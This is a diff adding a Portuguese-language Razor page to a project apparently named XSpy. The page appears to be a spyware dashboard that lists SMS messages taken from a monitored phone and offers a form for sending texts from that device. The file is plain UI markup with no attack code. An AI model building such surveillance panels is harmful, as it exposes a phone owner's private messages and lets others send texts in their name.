@@ -1,0 +1,107 @@
+﻿@{
+    ViewData["Title"] = "Mensagens";
+    ViewData["PageScript"] = "/js/app/device/messages.js";
+
+}
+@using XSpy.Shared
+@model XSpy.Shared.Models.Views.Device.DeviceDataViewModel
+
+@section Styles {
+    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/bs4/jszip-2.5.0/dt-1.10.23/b-1.6.5/b-html5-1.6.5/b-print-1.6.5/r-2.2.7/datatables.min.css"/>
+}
+
+@section PreScripts
+{
+    <script>
+        window.deviceId = '@Model.Device.Id';
+    </script>
+}
+
+<section class="content">
+    <div class="container-fluid">
+        <partial name="Partial/QuickActions"/>
+
+        <div class="row">
+            <div class="col-6">
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">Conversas</h3>
+                    </div>
+                    <!-- /.card-header -->
+                    <div class="card-body">
+                        <table id="dataTable" class="table table-hover table-text-center" style="width: 100%">
+                            <thead>
+                            <tr>
+                                <th></th>
+                                <th>Número</th>
+                                <th>Conteúdo</th>
+                                <th>Data</th>
+                            </tr>
+                            </thead>
+                            <tbody>
+
+                            @foreach (var call in Model.Device.Messages)
+                            {
+                                <tr>
+                                    
+                                    <td>
+                                        @if (call.Type == CallType.Incoming)
+                                        {
+                                            <i data-toggle="tooltip" title="Mensagem recebida" class="fas fa-external-link-alt" style="transform: scale(-1)"></i>
+                                        }
+                                        else if (call.Type == CallType.Outgoing)
+                                        {
+                                            <i data-toggle="tooltip" title="Mensagem enviada" class="fas fa-external-link-alt"></i>
+                                        }
+                                        else
+                                        {
+                                            <i data-toggle="tooltip" title="Mensagem recusada" class="fas fa-ban"></i>
+                                        }
+                                    </td>
+                                    <td>
+                                        @call.Body
+                                    </td>
+                                    <td>@call.Address</td>
+                                    <td>@call.Date</td>
+                                </tr>
+                            }
+                            </tbody>
+                        </table>
+                    </div>
+                    <!-- /.card-body -->
+                </div>
+            </div>
+
+
+            <div class="col-6">
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">Mensagens</h3>
+                    </div>
+                    <!-- /.card-header -->
+                    <form role="form" id="smsForm">
+                        <div class="card-body">
+                            <div class="row">
+                                <div class="col-sm-12">
+                                    <!-- textarea -->
+                                    <div class="form-group">
+                                        <label for="number">Número</label>
+                                        <input type="text" class="form-control" name="number" id="number" placeholder="" required="">
+                                    </div>
+                                    <div class="form-group">
+                                        <label>Mensagem</label>
+                                        <textarea class="form-control" rows="3" name="message" id="message" placeholder="Escreva o SMS" maxlenght="255" required=""></textarea>
+                                    </div>
+                                </div>
+                            </div>
+                            <hr/>
+                            <button type="button" id="sendSms" class="btn btn-primary float-right">Enviar</button>
+                        </div>
+                    </form>
+                    <!-- /.card-body -->
+                </div>
+            </div>
+        </div>
+
+    </div>
+</section>
